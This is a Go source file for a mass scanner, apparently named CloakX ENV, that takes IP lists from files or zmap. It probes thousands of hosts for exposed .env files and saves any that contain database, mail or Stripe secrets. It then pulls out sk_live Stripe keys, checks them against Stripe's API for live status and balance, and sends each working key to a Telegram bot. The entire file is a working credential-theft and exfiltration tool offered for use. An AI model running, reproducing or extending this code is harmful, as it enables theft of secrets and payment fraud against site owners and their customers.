package main

import (
	"bufio"
	"bytes"
	"context"
	"crypto/tls"
	"encoding/json"
	"flag"
	"fmt"
	"io"
	"net"
	"net/http"
	"os"
	"os/exec"
	"path/filepath"
	"regexp"
	"runtime"
	"runtime/debug"
	"strings"
	"sync"
	"sync/atomic"
	"time"
)

// Colors for console output
const (
	LGREEN = "\033[38;2;129;199;116m"
	LRED   = "\033[38;2;239;83;80m"
	RESET  = "\u001B[0m"
	LBLUE  = "\033[38;2;66;165;245m"
	GREY   = "\033[38;2;158;158;158m"
	YELLOW = "\033[38;2;255;193;7m"
)

// Stats holds scanning statistics using atomic operations for thread safety
type Stats struct {
	total       int64
	checked     int64
	status200   int64
	envFound    int64
	skLive      int64
	errors      int64
	startTime   int64
	lastChecked int64
	lastUpdate  int64
	bytesRead   int64
	activeConns int64
}

// AdvancedScanner holds the main scanning logic with extreme optimization
type AdvancedScanner struct {
	stats          *Stats
	httpClient     *http.Client
	httpsClient    *http.Client
	patterns       []string
	urlPatterns    []string
	skRegex        *regexp.Regexp
	skDotRegex     *regexp.Regexp
	skCleanRegex   *regexp.Regexp
	ctx            context.Context
	cancel         context.CancelFunc
	urlChan        chan string
	resultChan     chan *ScanResult
	maxGoroutines  int
	workerWG       sync.WaitGroup
	telegramBot    string
	telegramChatID string
	envFile        *os.File
	skLiveFile     *os.File
	skCleanFile    *os.File
	fileMutex      sync.Mutex
	semaphore      chan struct{}
	stripeClient   *http.Client
}

// ScanResult represents the result of a single scan
type ScanResult struct {
	URL     string
	Content string
	Status  int
}

// NewAdvancedScanner creates a new scanner with extreme optimization
func NewAdvancedScanner(timeout time.Duration, maxGoroutines int, telegramBot, telegramChatID string) *AdvancedScanner {
	ctx, cancel := context.WithCancel(context.Background())

	// Set memory limit and optimize GC
	debug.SetMemoryLimit(1536 * 1024 * 1024) // 1.5GB limit
	debug.SetGCPercent(30)                   // Very aggressive GC

	// Optimized transport configuration
	dialer := &net.Dialer{
		Timeout:   2 * time.Second,
		KeepAlive: 15 * time.Second,
		DualStack: true, // Enable IPv4 and IPv6
	}

	transport := &http.Transport{
		Dial:                  dialer.Dial,
		TLSClientConfig:       &tls.Config{InsecureSkipVerify: true},
		MaxIdleConns:          100,           // Increased for better connection reuse
		MaxIdleConnsPerHost:   10,            // Increased per host
		MaxConnsPerHost:       20,            // Increased concurrent connections
		IdleConnTimeout:       15 * time.Second,
		DisableKeepAlives:     false,
		DisableCompression:    true,
		ResponseHeaderTimeout: 3 * time.Second, // Reduced timeout
		ExpectContinueTimeout: 1 * time.Second,
		WriteBufferSize:       4 * 1024,  // Reduced buffer
		ReadBufferSize:        4 * 1024,  // Reduced buffer
		ForceAttemptHTTP2:     false,     // Disable HTTP/2 for speed
	}

	client := &http.Client{
		Transport: transport,
		Timeout:   timeout,
		CheckRedirect: func(req *http.Request, via []*http.Request) error {
			return http.ErrUseLastResponse
		},
	}

	// Stripe API client - optimized for speed
	stripeClient := &http.Client{
		Timeout: 8 * time.Second,
		Transport: &http.Transport{
			MaxIdleConns:        20,
			MaxIdleConnsPerHost: 5,
			IdleConnTimeout:     30 * time.Second,
			DisableCompression:  false, // Enable compression for Stripe
			TLSClientConfig:     &tls.Config{InsecureSkipVerify: false},
			DialContext: (&net.Dialer{
				Timeout:   3 * time.Second,
				KeepAlive: 30 * time.Second,
			}).DialContext,
		},
	}

	scanner := &AdvancedScanner{
		stats:       &Stats{startTime: time.Now().Unix()},
		httpClient:  client,
		httpsClient: client,
		patterns:    []string{"DB_HOST=", "MAIL_HOST=", "MAIL_USERNAME=", "sk_live", "APP_ENV="},
		urlPatterns: []string{
			"%s/.env",
			"%s/env",
			"%s/public/.env",
			"%s/public/env",
			"%s/app/.env",
			"%s/app/env",
		},
		skRegex:        regexp.MustCompile(`.*sk_live`),
		skDotRegex:     regexp.MustCompile(`.*sk\.live`),
		skCleanRegex:   regexp.MustCompile(`sk_live_[a-zA-Z0-9]{99,107}`),
		ctx:            ctx,
		cancel:         cancel,
		urlChan:        make(chan string, maxGoroutines/2),
		resultChan:     make(chan *ScanResult, 50),
		maxGoroutines:  maxGoroutines,
		telegramBot:    telegramBot,
		telegramChatID: telegramChatID,
		semaphore:      make(chan struct{}, maxGoroutines),
		stripeClient:   stripeClient,
	}

	// Open persistent file handles
	os.MkdirAll("ENVS", 0755)
	scanner.envFile, _ = os.OpenFile("sk_live_env.txt", os.O_CREATE|os.O_WRONLY|os.O_APPEND, 0644)
	scanner.skLiveFile, _ = os.OpenFile("sk_live_found.txt", os.O_CREATE|os.O_WRONLY|os.O_APPEND, 0644)
	scanner.skCleanFile, _ = os.OpenFile("sk_live_found_clean.txt", os.O_CREATE|os.O_WRONLY|os.O_APPEND, 0644)

	return scanner
}

// StartWorkers starts multiple worker goroutines
func (s *AdvancedScanner) StartWorkers() {
	// Start URL processing workers
	for i := 0; i < s.maxGoroutines; i++ {
		s.workerWG.Add(1)
		go s.worker()
	}

	// Start ONLY 2 result workers to prevent goroutine explosion
	go s.resultWorker()
	go s.resultWorker()

	// Start statistics updater
	go s.statsUpdater()

	// Start periodic GC every 20 seconds
	go s.periodicGC()
}

// periodicGC runs garbage collection periodically
func (s *AdvancedScanner) periodicGC() {
	ticker := time.NewTicker(20 * time.Second)
	defer ticker.Stop()

	for {
		select {
		case <-ticker.C:
			runtime.GC()
			debug.FreeOSMemory()
		case <-s.ctx.Done():
			return
		}
	}
}

// worker processes URLs from the channel
func (s *AdvancedScanner) worker() {
	defer s.workerWG.Done()

	for {
		select {
		case url, ok := <-s.urlChan:
			if !ok {
				return
			}
			s.scanURL(url)
		case <-s.ctx.Done():
			return
		}
	}
}

// resultWorker processes scan results
func (s *AdvancedScanner) resultWorker() {
	for {
		select {
		case result := <-s.resultChan:
			if result == nil {
				return
			}
			s.processResult(result)
			// Immediately clear to free memory
			result.Content = ""
		case <-s.ctx.Done():
			return
		}
	}
}

// scanURL scans a single URL - OPTIMIZED: Early exit on success
func (s *AdvancedScanner) scanURL(url string) {
	atomic.AddInt64(&s.stats.activeConns, 1)
	defer atomic.AddInt64(&s.stats.activeConns, -1)

	// Use semaphore to limit concurrent requests
	s.semaphore <- struct{}{}
	defer func() { <-s.semaphore }()

	ctx, cancel := context.WithTimeout(s.ctx, 5*time.Second) // Reduced timeout
	defer cancel()

	// Try patterns in order of likelihood
	protocols := []string{"https", "http"}
	
	for _, pattern := range s.urlPatterns {
		for _, protocol := range protocols {
			result := s.makeRequestWithPattern(ctx, url, protocol, pattern)
			if result != nil && result.Status == 200 {
				// Found valid response, send and exit immediately
				select {
				case s.resultChan <- result:
				case <-time.After(300 * time.Millisecond):
					// Drop if can't send within timeout
				}
				atomic.AddInt64(&s.stats.checked, 1)
				return
			}
			
			// Check context cancellation
			select {
			case <-ctx.Done():
				atomic.AddInt64(&s.stats.checked, 1)
				return
			default:
			}
		}
	}

	atomic.AddInt64(&s.stats.checked, 1)
}

// makeRequestWithPattern makes HTTP request with specific pattern - OPTIMIZED
func (s *AdvancedScanner) makeRequestWithPattern(ctx context.Context, url, protocol, pattern string) *ScanResult {
	fullURL := fmt.Sprintf("%s://"+pattern, protocol, url)

	req, err := http.NewRequestWithContext(ctx, "GET", fullURL, nil)
	if err != nil {
		atomic.AddInt64(&s.stats.errors, 1)
		return nil
	}

	req.Header.Set("User-Agent", "Mozilla/5.0")
	req.Header.Set("Accept", "*/*")
	req.Header.Set("Connection", "close")

	resp, err := s.httpClient.Do(req)
	if err != nil {
		atomic.AddInt64(&s.stats.errors, 1)
		return nil
	}
	defer resp.Body.Close()

	result := &ScanResult{
		URL:    fullURL,
		Status: resp.StatusCode,
	}

	if resp.StatusCode == 200 {
		atomic.AddInt64(&s.stats.status200, 1)

		// Limit to 256KB per response (reduced from 512KB)
		limitedReader := io.LimitReader(resp.Body, 256*1024)
		content, err := io.ReadAll(limitedReader)
		if err != nil {
			atomic.AddInt64(&s.stats.errors, 1)
			return result
		}

		atomic.AddInt64(&s.stats.bytesRead, int64(len(content)))
		result.Content = string(content)
	}

	return result
}

// processResult processes scan results - OPTIMIZED
func (s *AdvancedScanner) processResult(result *ScanResult) {
	if result.Content == "" {
		return
	}

	// Fast pattern check - check most common patterns first
	hasPattern := strings.Contains(result.Content, "sk_live") ||
		strings.Contains(result.Content, "DB_HOST=") ||
		strings.Contains(result.Content, "MAIL_HOST=") ||
		strings.Contains(result.Content, "APP_ENV=")

	if !hasPattern {
		return
	}

	atomic.AddInt64(&s.stats.envFound, 1)

	// Save ENV file asynchronously to not block
	go s.saveEnvFile(result.URL, result.Content)

	// Process Stripe keys if found
	if strings.Contains(result.Content, "sk_live") {
		atomic.AddInt64(&s.stats.skLive, 1)
		s.processSKKeys(result.URL, result.Content)
	}
}

// saveEnvFile saves environment file - REALTIME with immediate disk write
func (s *AdvancedScanner) saveEnvFile(url, content string) {
	// Sanitize URL for filename
	safeURL := strings.ReplaceAll(url, "://", "_")
	safeURL = strings.ReplaceAll(safeURL, "/", "_")
	safeURL = strings.ReplaceAll(safeURL, ":", "_")
	
	filename := filepath.Join("ENVS", fmt.Sprintf("%s_env.txt", safeURL))
	file, err := os.Create(filename)
	if err != nil {
		return
	}
	defer file.Close()

	// Write directly without buffering for realtime save
	file.WriteString(content)
	file.Sync() // Force immediate write to disk
}

// cleanStripeKey extracts and cleans Stripe key from text - OPTIMIZED
func (s *AdvancedScanner) cleanStripeKey(text string) string {
	// Fast path: check if sk_live_ exists
	idx := strings.Index(text, "sk_live_")
	if idx == -1 {
		return ""
	}

	// Extract substring starting from sk_live_
	remaining := text[idx:]
	if len(remaining) < 99 {
		return ""
	}

	// Fast extraction: take up to 107 chars and validate
	endIdx := 107
	if len(remaining) < endIdx {
		endIdx = len(remaining)
	}

	// Build key by filtering valid characters
	key := make([]byte, 0, 107)
	for i := 0; i < endIdx; i++ {
		ch := remaining[i]
		// Fast character validation
		if (ch >= 'a' && ch <= 'z') || (ch >= 'A' && ch <= 'Z') || (ch >= '0' && ch <= '9') || ch == '_' {
			key = append(key, ch)
		} else {
			break
		}
	}

	// Validate length
	if len(key) >= 99 && len(key) <= 107 {
		return string(key)
	}

	return ""
}

// checkStripeLive validates if Stripe key is live and gets detailed info in ONE API call
func (s *AdvancedScanner) checkStripeLive(key string) *StripeKeyInfo {
	info := &StripeKeyInfo{
		Key:      key,
		Status:   "❌ Invalid",
		Currency: "N/A",
		Balance:  "N/A",
		Country:  "N/A",
		IsLive:   false,
	}

	if key == "" || !strings.HasPrefix(key, "sk_live_") {
		return info
	}

	// Use account endpoint which returns both account info and default currency
	// This is more efficient than calling balance + account separately
	accountReq, err := http.NewRequest("GET", "https://api.stripe.com/v1/account", nil)
	if err != nil {
		return info
	}

	accountReq.SetBasicAuth(key, "")
	accountReq.Header.Set("Content-Type", "application/x-www-form-urlencoded")

	ctx, cancel := context.WithTimeout(context.Background(), 8*time.Second)
	defer cancel()
	accountReq = accountReq.WithContext(ctx)

	accountResp, err := s.stripeClient.Do(accountReq)
	if err != nil {
		return info
	}
	defer accountResp.Body.Close()

	if accountResp.StatusCode != 200 {
		return info
	}

	// Key is valid
	info.Status = "✅ Live"
	info.IsLive = true

	// Parse account info (includes country and default currency)
	accountBody, err := io.ReadAll(io.LimitReader(accountResp.Body, 50*1024)) // Limit to 50KB
	if err == nil {
		var accountData map[string]interface{}
		if json.Unmarshal(accountBody, &accountData) == nil {
			// Get country
			if country, ok := accountData["country"].(string); ok && country != "" {
				info.Country = strings.ToUpper(country)
			}
			
			// Get default currency
			if currency, ok := accountData["default_currency"].(string); ok && currency != "" {
				info.Currency = strings.ToUpper(currency)
			}
		}
	}

	// Only fetch balance if we need it (optional, can be removed for speed)
	// Using goroutine to not block the main response
	go func() {
		balanceReq, err := http.NewRequest("GET", "https://api.stripe.com/v1/balance", nil)
		if err != nil {
			return
		}

		balanceReq.SetBasicAuth(key, "")
		ctx2, cancel2 := context.WithTimeout(context.Background(), 5*time.Second)
		defer cancel2()
		balanceReq = balanceReq.WithContext(ctx2)

		balanceResp, err := s.stripeClient.Do(balanceReq)
		if err != nil {
			return
		}
		defer balanceResp.Body.Close()

		if balanceResp.StatusCode == 200 {
			var balance StripeBalance
			balanceBody, _ := io.ReadAll(io.LimitReader(balanceResp.Body, 10*1024))
			if json.Unmarshal(balanceBody, &balance) == nil && len(balance.Available) > 0 {
				amount := float64(balance.Available[0].Amount) / 100.0
				info.Balance = fmt.Sprintf("%.2f", amount)
			}
		}
	}()

	return info
}

// processSKKeys processes Stripe keys - OPTIMIZED with pooling
func (s *AdvancedScanner) processSKKeys(url, content string) {
	// Pre-check: fast scan for sk_live before processing
	if !strings.Contains(content, "sk_live") {
		return
	}

	// Extract and clean keys with early exit
	cleanedKeys := make([]string, 0, 5)
	keyMap := make(map[string]bool, 5) // For deduplication
	
	lines := strings.Split(content, "\n")
	for _, line := range lines {
		if len(cleanedKeys) >= 5 {
			break
		}
		
		if !strings.Contains(line, "sk_live") {
			continue
		}
		
		cleaned := s.cleanStripeKey(line)
		if cleaned != "" && !keyMap[cleaned] {
			keyMap[cleaned] = true
			cleanedKeys = append(cleanedKeys, cleaned)
		}
	}

	if len(cleanedKeys) == 0 {
		return
	}

	// Write to files IMMEDIATELY (realtime save)
	s.fileMutex.Lock()
	
	// sk_live_env.txt - Save IP and path
	if s.envFile != nil {
		fmt.Fprintf(s.envFile, "%s\n", url)
		s.envFile.Sync() // Force write to disk immediately
	}
	
	// sk_live_found.txt - Save raw keys (not cleaned)
	if s.skLiveFile != nil {
		for _, line := range lines {
			if strings.Contains(line, "sk_live") {
				fmt.Fprintf(s.skLiveFile, "%s\n", strings.TrimSpace(line))
			}
		}
		s.skLiveFile.Sync()
	}
	
	// sk_live_found_clean.txt - Save cleaned keys only
	if s.skCleanFile != nil {
		for _, key := range cleanedKeys {
			fmt.Fprintf(s.skCleanFile, "%s\n", key)
		}
		s.skCleanFile.Sync()
	}
	
	s.fileMutex.Unlock()

	// Check live keys and send telegram notification in real-time
	if s.telegramBot != "" && s.telegramChatID != "" {
		// Use semaphore to limit concurrent Stripe API calls
		stripeSem := make(chan struct{}, 3) // Max 3 concurrent Stripe checks
		
		for _, key := range cleanedKeys {
			stripeSem <- struct{}{} // Acquire
			
			go func(k string) {
				defer func() { <-stripeSem }() // Release
				
				// Check if key is live and get details
				keyInfo := s.checkStripeLive(k)
				
				// Send notification immediately if live
				if keyInfo.IsLive {
					s.sendTelegramNotification(url, keyInfo)
				}
			}(key)
		}
	}
}

// StripeBalance represents Stripe balance response
type StripeBalance struct {
	Available []struct {
		Amount   int64  `json:"amount"`
		Currency string `json:"currency"`
	} `json:"available"`
	Pending []struct {
		Amount   int64  `json:"amount"`
		Currency string `json:"currency"`
	} `json:"pending"`
}

// StripeAccount represents Stripe account response
type StripeAccount struct {
	Country      string `json:"country"`
	Email        string `json:"email"`
	BusinessName string `json:"business_profile.name"`
	Type         string `json:"type"`
}

// StripeKeyInfo holds detailed information about a live Stripe key
type StripeKeyInfo struct {
	Key      string
	Status   string
	Currency string
	Balance  string
	Country  string
	IsLive   bool
}

// TelegramMessage represents a telegram message payload
type TelegramMessage struct {
	ChatID    string `json:"chat_id"`
	Text      string `json:"text"`
	ParseMode string `json:"parse_mode"`
}

// sendTelegramNotification sends notification to telegram for LIVE keys only
func (s *AdvancedScanner) sendTelegramNotification(ip string, keyInfo *StripeKeyInfo) {
	if keyInfo == nil || !keyInfo.IsLive {
		return
	}

	message := fmt.Sprintf("🔴 *LIVE STRIPE KEY FOUND!*\n\n")
	message += fmt.Sprintf("📍 *IP:* `%s`\n", ip)
	message += fmt.Sprintf("🔑 *Key:* `%s`\n", keyInfo.Key)
	message += fmt.Sprintf("📊 *Status:* %s\n", keyInfo.Status)
	message += fmt.Sprintf("💰 *Currency:* %s\n", keyInfo.Currency)
	message += fmt.Sprintf("💵 *Balance:* %s\n", keyInfo.Balance)
	message += fmt.Sprintf("🌍 *Country:* %s\n\n", keyInfo.Country)
	message += fmt.Sprintf("⏰ *Time:* %s", time.Now().Format("2006-01-02 15:04:05"))

	telegramMsg := TelegramMessage{
		ChatID:    s.telegramChatID,
		Text:      message,
		ParseMode: "Markdown",
	}

	jsonData, _ := json.Marshal(telegramMsg)
	telegramURL := fmt.Sprintf("https://api.telegram.org/bot%s/sendMessage", s.telegramBot)

	req, err := http.NewRequest("POST", telegramURL, bytes.NewBuffer(jsonData))
	if err != nil {
		return
	}
	req.Header.Set("Content-Type", "application/json")

	client := &http.Client{Timeout: 5 * time.Second}
	resp, err := client.Do(req)
	if err != nil {
		return
	}
	resp.Body.Close()
}

// statsUpdater updates statistics
func (s *AdvancedScanner) statsUpdater() {
	ticker := time.NewTicker(2 * time.Second)
	defer ticker.Stop()

	for {
		select {
		case <-ticker.C:
			s.printAdvancedStats()
		case <-s.ctx.Done():
			return
		}
	}
}

// printAdvancedStats displays statistics
func (s *AdvancedScanner) printAdvancedStats() {
	total := atomic.LoadInt64(&s.stats.total)
	checked := atomic.LoadInt64(&s.stats.checked)
	status200 := atomic.LoadInt64(&s.stats.status200)
	envFound := atomic.LoadInt64(&s.stats.envFound)
	skLive := atomic.LoadInt64(&s.stats.skLive)
	errors := atomic.LoadInt64(&s.stats.errors)
	bytesRead := atomic.LoadInt64(&s.stats.bytesRead)
	activeConns := atomic.LoadInt64(&s.stats.activeConns)

	elapsed := time.Now().Unix() - atomic.LoadInt64(&s.stats.startTime)
	if elapsed == 0 {
		elapsed = 1
	}
	rate := float64(checked) / float64(elapsed)

	lastChecked := atomic.LoadInt64(&s.stats.lastChecked)
	recentRate := float64(checked-lastChecked) / 2.0
	atomic.StoreInt64(&s.stats.lastChecked, checked)

	var m runtime.MemStats
	runtime.ReadMemStats(&m)

	progress := float64(0)
	if total > 0 {
		progress = (float64(checked) / float64(total)) * 100
	}

	fmt.Printf("\r"+LGREEN+"[FIXED]"+RESET+" Progress: %.1f%% | Total: %d | Checked: %d | 200: %d | ENV: %d | SK: %d | Err: %d | Active: %d | Rate: %.0f/s | Recent: %.0f/s | Data: %.1fMB | Mem: %dMB | GR: %d   ",
		progress, total, checked, status200, envFound, skLive, errors, activeConns, rate, recentRate,
		float64(bytesRead)/1024/1024, m.Alloc/1024/1024, runtime.NumGoroutine())
}

// clearScreen clears the console screen
func clearScreen() {
	var cmd *exec.Cmd
	if runtime.GOOS == "windows" {
		cmd = exec.Command("cmd", "/c", "cls")
	} else {
		cmd = exec.Command("clear")
	}
	cmd.Stdout = os.Stdout
	cmd.Run()
}

// banner displays the application banner
func banner() {
	clearScreen()
	fmt.Println(LRED + `
   ____   _                   _     __  __    _____   _   _  __     __
  / ___| | |   ___     __ _  | | __ \ \/ /   | ____| | \ | | \ \   / /
 | |     | |  / _ \   / _, | | |/ /  \  /    |  _|   |  \| |  \ \ / / 
 | |___  | | | (_) | | (_| | |   <   /  \    | |___  | |\  |   \ V /  
  \____| |_|  \___/   \__,_| |_|\_\ /_/\_\   |_____| |_| \_|    \_/   
                                                                                                                          
                                        Dev/Admin: @bolongyn  V1.1
` + RESET)
	fmt.Println(LBLUE + "		FIXED: No More Goroutine Leak - Stable RAM Usage" + RESET)
	fmt.Println(GREY + "Usage:" + RESET)
	fmt.Println("  -t         Threads (default: 1000)")
	fmt.Println("  -f         File Ips Input (.txt)")
	fmt.Println("  -z         Use for zmap input from stdin")
	fmt.Println("  -timeout   HTTP timeout in seconds (default: 8)")
	fmt.Println("  -beast     Enable beast mode (auto-optimize for CPU)")
	fmt.Println("  -ultra     Enable ultra mode (maximum performance)")
	fmt.Println("  -telegram  Telegram bot token")
	fmt.Println("  -chat      Telegram chat ID")
	fmt.Println("  -nowait    Don't wait for Enter before exit")
	fmt.Println()
	fmt.Println(GREY + "Performance Modes:" + RESET)
	fmt.Println("  Normal     : Conservative (use -t to set threads)")
	fmt.Println("  Beast      : CPU_cores × 500 threads, optimized GC")
	fmt.Println("  Ultra      : CPU_cores × 1000 threads, extreme performance")
	fmt.Println()
}

// processFromStdin processes URLs from stdin
func (s *AdvancedScanner) processFromStdin() {
	scanner := bufio.NewScanner(os.Stdin)
	scanner.Buffer(make([]byte, 32*1024), 32*1024)

	go func() {
		defer close(s.urlChan)
		for scanner.Scan() {
			url := strings.TrimSpace(scanner.Text())
			if url == "" {
				continue
			}

			atomic.AddInt64(&s.stats.total, 1)

			select {
			case s.urlChan <- url:
			case <-s.ctx.Done():
				return
			case <-time.After(100 * time.Millisecond):
				// Drop if channel is full
			}
		}
	}()

	s.workerWG.Wait()
}

// processFromFile processes URLs from file
func (s *AdvancedScanner) processFromFile(filename string) error {
	file, err := os.Open(filename)
	if err != nil {
		return fmt.Errorf("failed to open file: %w", err)
	}
	defer file.Close()

	scanner := bufio.NewScanner(file)
	scanner.Buffer(make([]byte, 32*1024), 32*1024)

	go func() {
		defer close(s.urlChan)
		for scanner.Scan() {
			url := strings.TrimSpace(scanner.Text())
			if url == "" {
				continue
			}

			atomic.AddInt64(&s.stats.total, 1)

			select {
			case s.urlChan <- url:
			case <-s.ctx.Done():
				return
			}
		}
	}()

	s.workerWG.Wait()
	return scanner.Err()
}

// Close closes all resources
func (s *AdvancedScanner) Close() {
	s.fileMutex.Lock()
	defer s.fileMutex.Unlock()

	if s.envFile != nil {
		s.envFile.Close()
	}
	if s.skLiveFile != nil {
		s.skLiveFile.Close()
	}
	if s.skCleanFile != nil {
		s.skCleanFile.Close()
	}
}

func main() {
	var (
		useZmap        = flag.Bool("z", false, "Use zmap input from stdin")
		threads        = flag.Int("t", 1000, "Number of threads")
		filename       = flag.String("f", "", "Path to URL file")
		timeoutSecs    = flag.Int("timeout", 8, "HTTP timeout in seconds")
		beastMode      = flag.Bool("beast", false, "Enable beast mode (auto-optimize for CPU)")
		ultraMode      = flag.Bool("ultra", false, "Enable ultra mode (maximum performance)")
		telegramBot    = flag.String("telegram", "", "Telegram bot token")
		telegramChatID = flag.String("chat", "", "Telegram chat ID")
		noWait         = flag.Bool("nowait", false, "Don't wait for Enter before exit")
	)
	flag.Parse()

	// Function to wait for Enter before exit
	waitForExit := func() {
		if !*noWait {
			fmt.Printf("\n" + LBLUE + "Press Enter to exit..." + RESET)
			bufio.NewReader(os.Stdin).ReadBytes('\n')
		}
	}

	if !*useZmap && *filename == "" {
		banner()
		fmt.Println(LRED + "Error: Either -z or -f must be specified" + RESET)
		waitForExit()
		os.Exit(1)
	}

	if *threads <= 0 {
		banner()
		fmt.Println(LRED + "Error: Number of threads must be greater than 0" + RESET)
		waitForExit()
		os.Exit(1)
	}

	if (*telegramBot != "" && *telegramChatID == "") || (*telegramBot == "" && *telegramChatID != "") {
		banner()
		fmt.Println(LRED + "Error: Both -telegram and -chat must be specified" + RESET)
		waitForExit()
		os.Exit(1)
	}

	if *telegramBot != "" && *telegramChatID != "" {
		fmt.Printf(LGREEN + "📱 Telegram notifications enabled\n" + RESET)
	}

	// Auto-detect CPU and optimize settings
	numCPU := runtime.NumCPU()
	fmt.Printf(LBLUE+"💻 Detected %d CPU cores\n"+RESET, numCPU)

	if *ultraMode {
		// Ultra mode: MAXIMUM performance (use with caution)
		oldThreads := *threads
		
		// Ultra aggressive: 1000 threads per core
		multiplier := 1000
		*threads = numCPU * multiplier
		
		// Very short timeout
		*timeoutSecs = 3
		
		// Use all CPUs + enable parallel GC
		runtime.GOMAXPROCS(numCPU * 2) // Oversubscribe for I/O bound tasks
		
		// Minimal GC interference
		debug.SetGCPercent(10) // Extremely aggressive GC
		debug.SetMemoryLimit(3072 * 1024 * 1024) // 3GB limit
		
		fmt.Println(LRED + "⚡ ULTRA MODE - MAXIMUM PERFORMANCE ⚡" + RESET)
		fmt.Printf(LRED+"   CPU Cores    : %d\n"+RESET, numCPU)
		fmt.Printf(LRED+"   Threads      : %d → %d (x%.1f)\n"+RESET, oldThreads, *threads, float64(*threads)/float64(oldThreads))
		fmt.Printf(LRED+"   Timeout      : %ds\n"+RESET, *timeoutSecs)
		fmt.Printf(LRED+"   GOMAXPROCS   : %d (oversubscribed)\n"+RESET, numCPU*2)
		fmt.Printf(LRED+"   Memory Limit : 3GB\n"+RESET)
		fmt.Printf(LRED+"   GC Percent   : 10%% (extreme)\n"+RESET)
		fmt.Printf(YELLOW+"   ⚠️  WARNING: High CPU/Memory usage!\n"+RESET)
		
	} else if *beastMode {
		// Beast mode: Aggressive optimization
		oldThreads := *threads
		
		// Calculate optimal threads based on CPU
		// Formula: threads = CPU_cores * multiplier
		multiplier := 500 // 500 threads per core
		*threads = numCPU * multiplier
		
		// Reduce timeout for faster scanning
		*timeoutSecs = 5
		
		// Set GOMAXPROCS to use all CPUs
		runtime.GOMAXPROCS(numCPU)
		
		// Aggressive GC settings
		debug.SetGCPercent(20) // Very aggressive GC
		debug.SetMemoryLimit(2048 * 1024 * 1024) // 2GB limit
		
		fmt.Println(LRED + "🔥 BEAST MODE ACTIVATED 🔥" + RESET)
		fmt.Printf(LRED+"   CPU Cores    : %d\n"+RESET, numCPU)
		fmt.Printf(LRED+"   Threads      : %d → %d (x%.1f)\n"+RESET, oldThreads, *threads, float64(*threads)/float64(oldThreads))
		fmt.Printf(LRED+"   Timeout      : %ds\n"+RESET, *timeoutSecs)
		fmt.Printf(LRED+"   GOMAXPROCS   : %d\n"+RESET, numCPU)
		fmt.Printf(LRED+"   Memory Limit : 2GB\n"+RESET)
		fmt.Printf(LRED+"   GC Percent   : 20%%\n"+RESET)
	} else {
		// Normal mode: Conservative settings
		runtime.GOMAXPROCS(numCPU)
		fmt.Printf(LGREEN+"✅ Normal mode with %d threads\n"+RESET, *threads)
	}

	timeout := time.Duration(*timeoutSecs) * time.Second
	scanner := NewAdvancedScanner(timeout, *threads, *telegramBot, *telegramChatID)
	defer scanner.Close()
	defer scanner.cancel()

	scanner.StartWorkers()

	if err := os.MkdirAll("ENVS", 0755); err != nil {
		fmt.Printf(LRED+"Error creating ENVS directory: %v\n"+RESET, err)
		waitForExit()
		os.Exit(1)
	}

	fmt.Printf(LGREEN+"🚀 Starting scan with %d threads (goroutine-safe)...\n"+RESET, *threads)

	startTime := time.Now()
	if *useZmap {
		fmt.Println(LBLUE + "Processing URLs from zmap stdin..." + RESET)
		scanner.processFromStdin()
	} else {
		fmt.Printf(LBLUE+"Processing URLs from file: %s\n"+RESET, *filename)
		if err := scanner.processFromFile(*filename); err != nil {
			fmt.Printf(LRED+"Error: %v\n"+RESET, err)
			waitForExit()
			os.Exit(1)
		}
	}

	fmt.Println(LBLUE + "\nFinalizing..." + RESET)
	time.Sleep(3 * time.Second)

	runtime.GC()
	debug.FreeOSMemory()

	elapsed := time.Since(startTime)
	total := atomic.LoadInt64(&scanner.stats.total)
	checked := atomic.LoadInt64(&scanner.stats.checked)
	status200 := atomic.LoadInt64(&scanner.stats.status200)
	envFound := atomic.LoadInt64(&scanner.stats.envFound)
	skLive := atomic.LoadInt64(&scanner.stats.skLive)
	errors := atomic.LoadInt64(&scanner.stats.errors)
	bytesRead := atomic.LoadInt64(&scanner.stats.bytesRead)

	fmt.Printf("\n\n" + LGREEN + "🎉 SCAN COMPLETED! 🎉\n" + RESET)
	fmt.Printf("═══════════════════════════════════════════════════════════════\n")
	fmt.Printf(LBLUE + "📊 Final Statistics:\n" + RESET)
	fmt.Printf("  🎯 Total URLs: %s%d%s\n", LGREEN, total, RESET)
	fmt.Printf("  ✅ Checked: %s%d%s\n", LGREEN, checked, RESET)
	fmt.Printf("  📡 HTTP 200: %s%d%s\n", LGREEN, status200, RESET)
	fmt.Printf("  🔍 ENV Found: %s%d%s\n", LGREEN, envFound, RESET)
	fmt.Printf("  💰 SK Live: %s%d%s\n", LGREEN, skLive, RESET)
	fmt.Printf("  ❌ Errors: %s%d%s\n", LRED, errors, RESET)
	fmt.Printf("  📦 Data Read: %s%.2f MB%s\n", LBLUE, float64(bytesRead)/1024/1024, RESET)
	fmt.Printf("  ⏱️  Total Time: %s%v%s\n", LBLUE, elapsed, RESET)
	fmt.Printf("  🚀 Average Rate: %s%.0f req/s%s\n", LGREEN, float64(checked)/elapsed.Seconds(), RESET)
	fmt.Printf("═══════════════════════════════════════════════════════════════\n")
	
	// Wait for Enter before exit
	waitForExit()
}
